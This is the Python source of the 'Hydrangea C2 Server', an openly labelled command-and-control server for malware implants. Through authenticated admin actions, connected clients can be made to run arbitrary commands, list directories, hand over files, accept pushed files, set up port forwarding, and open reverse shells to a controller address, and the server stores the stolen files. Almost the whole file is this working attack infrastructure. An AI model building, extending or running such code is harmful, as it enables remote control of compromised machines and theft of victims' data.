#!/usr/bin/env python3

import argparse
import asyncio
import hashlib
import logging
import os
import shutil
import ssl
import subprocess
import time
import uuid
from typing import Any, Dict, Optional, Set
import logging.handlers

__version__ = "3.2"

from .utils.common import read_frame, write_frame, ProtocolError, safe_join

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
file_handler = logging.FileHandler("hydrangea_server.log")
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(
    logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
)
logging.getLogger().addHandler(file_handler)
log = logging.getLogger("hydrangea.server")


# ── TLS helpers ───────────────────────────────────────────────────────────────

def _gen_self_signed_cert(cert_path: str, key_path: str) -> None:
    """Generate a self-signed cert + key via openssl (RSA-2048, 10-year validity)."""
    if not shutil.which("openssl"):
        raise RuntimeError(
            "openssl not found in PATH. "
            "Provide --tls-cert and --tls-key manually, or install openssl."
        )
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-keyout", key_path, "-out", cert_path,
            "-days", "3650", "-subj", "/CN=hydrangea-c2",
        ],
        check=True,
        capture_output=True,
    )
    log.info(f"Generated TLS certificate: {cert_path}  key: {key_path}")


def _cert_fingerprint(cert_path: str) -> str:
    """Return the hex SHA256 fingerprint of a PEM certificate (no colons)."""
    with open(cert_path) as fh:
        pem = fh.read()
    der = ssl.PEM_cert_to_DER_cert(pem)
    return hashlib.sha256(der).hexdigest()


def _make_ssl_context(cert_path: str, key_path: str) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_path, key_path)
    return ctx


class ClientSession:
    def __init__(self, client_id: str, writer: asyncio.StreamWriter):
        self.client_id = client_id
        self.writer = writer
        self.queue: "asyncio.Queue[dict]" = asyncio.Queue()
        self.alive = True
        self.last_seen: float = time.time()
        self.pump_task: Optional[asyncio.Task] = None


class Server:
    def __init__(
        self,
        host: str,
        ports: list[int],
        storage: str,
        auth_token: str,
        ssl_ctx: Optional[ssl.SSLContext] = None,
    ):
        self.host = host
        self.ports = ports
        self.storage = storage
        self.auth_token = auth_token
        self.ssl_ctx = ssl_ctx
        os.makedirs(self.storage, exist_ok=True)
        self.clients: Dict[str, ClientSession] = {}
        self.servers: list[asyncio.base_events.Server] = []
        self.pending: Dict[str, asyncio.Future] = {}
        # Maps client_id -> set of req_ids currently waiting for that client.
        # Used to cancel futures immediately when the client disconnects.
        self.client_futures: Dict[str, Set[str]] = {}
        self.log_buffer = logging.handlers.MemoryHandler(capacity=100, target=None)
        logging.getLogger().addHandler(self.log_buffer)

    async def start(self):
        log.info(
            f"Starting on {self.host}:{', '.join(map(str, self.ports))}  storage={self.storage}"
        )
        for port in self.ports:
            srv = await asyncio.start_server(
                self.handle_connection, self.host, port, ssl=self.ssl_ctx
            )
            self.servers.append(srv)
            sockets = ", ".join(str(s.getsockname()) for s in srv.sockets or [])
            log.info(f"Listening on {sockets}")
        asyncio.create_task(self._keepalive_loop())
        await asyncio.gather(*(srv.serve_forever() for srv in self.servers))

    async def handle_connection(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ):
        peer = writer.get_extra_info("peername")
        try:
            header, payload = await read_frame(reader)
        except Exception as e:
            log.warning(f"{peer} failed to send initial frame: {e}")
            writer.close()
            await writer.wait_closed()
            return

        msg_type = header.get("type")
        token = header.get("token")
        if token != self.auth_token:
            log.warning(f"Auth failed from {peer}")
            await write_frame(writer, {"type": "ERROR", "error": "auth_failed"})
            writer.close()
            await writer.wait_closed()
            return

        if msg_type == "REGISTER":
            await self.handle_client(reader, writer, header)
        elif msg_type == "ADMIN":
            log.info(f"Admin connected from {peer} action={header.get('action')}")
            await self.handle_admin(reader, writer, header, payload)
        else:
            await write_frame(
                writer, {"type": "ERROR", "error": "invalid_initial_type"}
            )
            writer.close()
            await writer.wait_closed()

    async def handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        header: Dict[str, Any],
    ):
        client_id = header.get("client_id")
        if not client_id:
            await write_frame(writer, {"type": "ERROR", "error": "missing_client_id"})
            writer.close()
            await writer.wait_closed()
            return

        # Handle test connections separately
        if client_id.startswith("test-connection"):
            await write_frame(
                writer, {"type": "REGISTERED", "server_version": __version__}
            )
            log.info(f"Test connection successful: {client_id}")
            writer.close()
            await writer.wait_closed()
            return

        # Replace existing session if duplicate
        if client_id in self.clients:
            try:
                self.clients[client_id].writer.close()
            except Exception:
                pass

        session = ClientSession(client_id, writer)
        self.clients[client_id] = session
        await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
        log.info(f"Client registered: {client_id}")

        # Start a task to pump orders to client; store ref for clean cancellation
        session.pump_task = asyncio.create_task(self._pump_orders(session))

        try:
            while not reader.at_eof():
                header, payload = await read_frame(reader)
                session.last_seen = time.time()
                t = header.get("type")
                if t == "PONG":
                    log.debug(f"[{client_id}] PONG")

                elif t == "RESULT_LIST_DIR":
                    rid = header.get("req_id")
                    if rid and rid in self.pending:
                        fut = self.pending.pop(rid)
                        if not fut.done():
                            fut.set_result((header, payload))
                    else:
                        log.info(
                            f"[{client_id}] LIST_DIR {header.get('path')} -> "
                            f"{header.get('entries_count', '?')} entries"
                        )

                elif t == "RESULT_EXEC":
                    rid = header.get("req_id")
                    if rid and rid in self.pending:
                        fut = self.pending.pop(rid)
                        if not fut.done():
                            fut.set_result((header, payload))
                    else:
                        log.info(f"[{client_id}] EXEC result rc={header.get('rc')}")

                elif t == "RESULT_SESSION_INFO":
                    rid = header.get("req_id")
                    if rid and rid in self.pending:
                        fut = self.pending.pop(rid)
                        if not fut.done():
                            fut.set_result((header, payload))
                    else:
                        log.info(f"[{client_id}] SESSION_INFO received")

                elif t == "FILE":
                    # Client sent a file in response to PULL_FILE
                    try:
                        rel = header.get("save_as") or os.path.basename(
                            header.get("src_path", "file.bin")
                        )

                        if rel and os.path.isabs(rel):
                            # Absolute save path: respect it (write anywhere on server)
                            dest_path = os.path.realpath(rel)
                            os.makedirs(
                                os.path.dirname(dest_path) or "/", exist_ok=True
                            )
                        else:
                            # Relative: keep it under server_storage/<client_id>/
                            dest_dir = os.path.join(self.storage, client_id)
                            os.makedirs(dest_dir, exist_ok=True)
                            dest_path = safe_join(dest_dir, rel or "file.bin")
                            os.makedirs(
                                os.path.dirname(dest_path) or dest_dir, exist_ok=True
                            )

                        with open(dest_path, "wb") as f:
                            f.write(payload or b"")

                        log.info(
                            f"[{client_id}] Received file -> {dest_path} "
                            f"({len(payload or b'')} bytes, sha256={header.get('sha256')})"
                        )
                        await write_frame(
                            writer, {"type": "ACK", "ack": "FILE", "save_as": rel}
                        )
                    except Exception as e:
                        # Do not drop the client session; just log the error.
                        log.exception(f"[{client_id}] Failed saving incoming FILE: {e}")

                elif t == "LOG":
                    log.info(f"[{client_id}] {header.get('message')}")

                elif t == "REVERSE_SHELL":
                    controller_addr = header.get("controller_addr")
                    if not controller_addr:
                        response = {
                            "type": "ERROR",
                            "message": "Controller address missing",
                        }
                        await write_frame(writer, response, b"")
                        continue

                    response = {
                        "type": "REVERSE_SHELL",
                        "controller_addr": controller_addr,
                    }
                    await write_frame(writer, response, b"")

                else:
                    log.debug(f"[{client_id}] Unhandled message type: {t}")
        except (ProtocolError, asyncio.IncompleteReadError) as e:
            log.warning(f"Client {client_id} disconnected: {e}")
        except Exception as e:
            log.exception(f"Error handling client {client_id}: {e}")
        finally:
            # Cancel the pump task so it doesn't linger after disconnect
            if session.pump_task and not session.pump_task.done():
                session.pump_task.cancel()
            # Immediately cancel any admin futures waiting for this client
            # so callers get CancelledError instead of waiting for full timeout
            for rid in self.client_futures.pop(client_id, set()):
                fut = self.pending.pop(rid, None)
                if fut and not fut.done():
                    fut.cancel()
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            if self.clients.get(client_id) is session:
                del self.clients[client_id]
            log.info(f"Client {client_id} removed")

    async def _pump_orders(self, session: ClientSession):
        try:
            while session.alive:
                try:
                    order = await session.queue.get()
                    await write_frame(
                        session.writer, order["header"], order.get("payload", b"")
                    )
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    log.warning(f"Failed to send order to {session.client_id}: {e}")
                    break
        except asyncio.CancelledError:
            pass
        finally:
            session.alive = False

    async def _keepalive_loop(self, interval: int = 30, dead_after: int = 90):
        """Ping all clients every `interval` seconds; evict those silent for `dead_after` seconds."""
        while True:
            await asyncio.sleep(interval)
            now = time.time()
            # Identify stale clients before iterating further
            dead = [
                cid for cid, sess in list(self.clients.items())
                if now - sess.last_seen > dead_after
            ]
            for cid in dead:
                sess = self.clients.get(cid)
                if sess:
                    log.warning(
                        f"Keepalive: evicting stale client {cid} "
                        f"(last seen {int(now - sess.last_seen)}s ago)"
                    )
                    sess.alive = False
                    try:
                        sess.writer.close()
                    except Exception:
                        pass
            # Ping all remaining live clients
            for sess in list(self.clients.values()):
                try:
                    await sess.queue.put({"header": {"type": "PING"}})
                except Exception:
                    pass

    def get_health_status(self):
        """Generate the server's health status."""
        log_entries = []
        for record in self.log_buffer.buffer:
            log_entries.append(self.log_buffer.format(record))

        return {
            "status": "running",
            "connected_agents": len(self.clients),
            "recent_logs": log_entries[-10:],  # Last 10 log entries
        }

    async def handle_admin(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        header: Dict[str, Any],
        payload: bytes,
    ):
        action = header.get("action")
        target = header.get("target_id")
        if action not in {
            "list",
            "pull",
            "push",
            "ping",
            "clients",
            "exec",
            "session_info",
            "health_status",
            "reverse_shell",
            "port_forward",
        }:
            await write_frame(
                writer, {"type": "ERROR", "error": "unknown_admin_action"}
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "clients":
            await write_frame(
                writer, {"type": "CLIENTS", "clients": list(self.clients.keys())}
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "ping":
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
            else:
                session = self.clients[target]
                await write_frame(session.writer, {"type": "PING"})
                await write_frame(writer, {"type": "OK"})
            writer.close()
            await writer.wait_closed()
            return

        if action == "health_status":
            health_status = self.get_health_status()
            await write_frame(writer, {"type": "HEALTH_STATUS", **health_status})
            writer.close()
            await writer.wait_closed()
            return

        # actions below need a valid target
        if not target or target not in self.clients:
            await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
            writer.close()
            await writer.wait_closed()
            return

        session = self.clients[target]

        if action == "list":
            path = header.get("path", ".")
            wait = bool(header.get("wait", False))
            timeout = float(header.get("timeout", 10.0))

            if wait:
                req_id = uuid.uuid4().hex
                fut: asyncio.Future = asyncio.get_running_loop().create_future()
                self.pending[req_id] = fut
                self.client_futures.setdefault(target, set()).add(req_id)
                order = {"header": {"type": "LIST_DIR", "path": path, "req_id": req_id}}
                await session.queue.put(order)
                try:
                    res_header, res_payload = await asyncio.wait_for(
                        fut, timeout=timeout
                    )
                    await write_frame(writer, res_header, res_payload)
                except asyncio.TimeoutError:
                    await write_frame(
                        writer, {"type": "ERROR", "error": "timeout", "path": path}
                    )
                finally:
                    self.pending.pop(req_id, None)
                writer.close()
                await writer.wait_closed()
                return
            else:
                order = {"header": {"type": "LIST_DIR", "path": path}}
                await session.queue.put(order)
                await write_frame(
                    writer, {"type": "QUEUED", "order": "list", "path": path}
                )
                writer.close()
                await writer.wait_closed()
                return

        if action == "pull":
            # Ask client to send us a file
            src = header.get("src")
            save_as = header.get("dest") or os.path.basename(src or "")
            if not src:
                await write_frame(writer, {"type": "ERROR", "error": "missing_src"})
                writer.close()
                await writer.wait_closed()
                return
            order = {
                "header": {"type": "PULL_FILE", "src_path": src, "save_as": save_as}
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {"type": "QUEUED", "order": "pull", "src": src, "save_as": save_as},
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "push":
            # Send a file to client. Payload contains the file bytes.
            dest = header.get("dest")
            src_name = header.get("src_name")
            if dest is None:
                await write_frame(
                    writer, {"type": "ERROR", "error": "missing_dest_or_payload"}
                )
                writer.close()
                await writer.wait_closed()
                return
            order = {
                "header": {
                    "type": "PUSH_FILE",
                    "dest_path": dest,
                    "src_name": src_name or "server_upload.bin",
                },
                "payload": payload or b"",
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {
                    "type": "QUEUED",
                    "order": "push",
                    "dest": dest,
                    "bytes": len(payload or b""),
                },
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "exec":
            cmd = header.get("cmd")
            if not cmd:
                await write_frame(writer, {"type": "ERROR", "error": "missing_cmd"})
                writer.close()
                await writer.wait_closed()
                return
            shell = bool(header.get("shell", False))
            cwd = header.get("cwd")
            timeout = float(header.get("timeout", 30.0))
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            self.client_futures.setdefault(target, set()).add(req_id)
            order = {
                "header": {
                    "type": "EXEC",
                    "cmd": cmd,
                    "shell": shell,
                    "cwd": cwd,
                    "req_id": req_id,
                    "timeout": timeout,
                }
            }
            await session.queue.put(order)
            try:
                res_header, res_payload = await asyncio.wait_for(
                    fut, timeout=timeout + 1.0
                )
                await write_frame(writer, res_header, res_payload)
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "session_info":
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            self.client_futures.setdefault(target, set()).add(req_id)
            order = {"header": {"type": "SESSION_INFO", "req_id": req_id}}
            await session.queue.put(order)
            try:
                res_header, res_payload = await asyncio.wait_for(
                    fut, timeout=float(header.get("timeout", 5.0))
                )
                await write_frame(writer, res_header, res_payload)
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "port_forward":
            filename = header.get("filename")
            connect_args = header.get("connect_args")
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close()
                await writer.wait_closed()
                return
            session = self.clients[target]
            order = {
                "header": {
                    "type": "PORT_FORWARD",
                    "filename": filename,
                    "connect_args": connect_args,
                }
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {"type": "QUEUED", "order": "port_forward", "filename": filename},
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "reverse_shell":
            controller_addr = header.get("controller_addr")
            if not controller_addr:
                await write_frame(
                    writer, {"type": "ERROR", "error": "missing_controller_addr"}
                )
                writer.close()
                await writer.wait_closed()
                return
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close()
                await writer.wait_closed()
                return
            session = self.clients[target]
            order = {
                "header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {
                    "type": "QUEUED",
                    "order": "reverse_shell",
                    "controller_addr": controller_addr,
                },
            )
            writer.close()
            await writer.wait_closed()
            return


art = r"""

   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████         ▄████████    ▄████████    ▄████████  ▄█    █▄     ▄████████    ▄████████ 
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███        ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███        ███    █▀    ███    █▀    ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███        ███         ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████      ▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███               ███   ███    █▄  ▀███████████ ███    ███   ███    █▄  ▀███████████ 
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███         ▄█    ███   ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀        ▄████████▀    ██████████   ███    ███  ▀██████▀    ██████████   ███    ███ 
                                      ███    ███                                                                                                ███    ███                           ███    ███ 

              Hydrangea C2 Server
"""


async def amain():
    ap = argparse.ArgumentParser(description="Hydrangea server")
    ap.add_argument("--host", default="0.0.0.0", help="Bind address")
    ap.add_argument(
        "--ports",
        default=["9000"],
        nargs="+",
        type=int,
        help="Ports to listen on (space-separated)",
    )
    ap.add_argument(
        "--storage",
        default="./server_storage",
        help="Directory to store incoming files",
    )
    ap.add_argument("--auth-token", required=True, help="Shared auth token")
    ap.add_argument("--tls-cert",  default=None, metavar="PEM", help="TLS certificate file")
    ap.add_argument("--tls-key",   default=None, metavar="PEM", help="TLS private key file")
    ap.add_argument(
        "--tls-auto", action="store_true",
        help="Auto-generate a self-signed TLS cert (requires openssl in PATH)",
    )

    args = ap.parse_args()

    # ── TLS setup ─────────────────────────────────────────────────────────────
    ssl_ctx: Optional[ssl.SSLContext] = None
    tls_fingerprint: Optional[str] = None

    if args.tls_auto or (args.tls_cert and args.tls_key):
        cert_path = args.tls_cert or "hydrangea.crt"
        key_path  = args.tls_key  or "hydrangea.key"
        if args.tls_auto and (
            not os.path.exists(cert_path) or not os.path.exists(key_path)
        ):
            _gen_self_signed_cert(cert_path, key_path)
        ssl_ctx = _make_ssl_context(cert_path, key_path)
        tls_fingerprint = _cert_fingerprint(cert_path)

    # ── banner ────────────────────────────────────────────────────────────────
    print(art)
    print(f"  Version      {__version__}")
    print(f"  Host         {args.host}")
    print(f"  Ports        {', '.join(map(str, args.ports))}")
    print(f"  Storage      {args.storage}")
    if ssl_ctx:
        print(f"  TLS          enabled")
        print(f"  Cert         {cert_path}")
        print(f"  Fingerprint  {tls_fingerprint}")
    else:
        print(f"  TLS          disabled  (pass --tls-auto or --tls-cert/--tls-key to enable)")
    print()

    srv = Server(args.host, args.ports, args.storage, args.auth_token, ssl_ctx=ssl_ctx)
    try:
        await srv.start()
    except KeyboardInterrupt:
        print("Shutting down...")


def main() -> None:
    asyncio.run(amain())


if __name__ == "__main__":
    main()
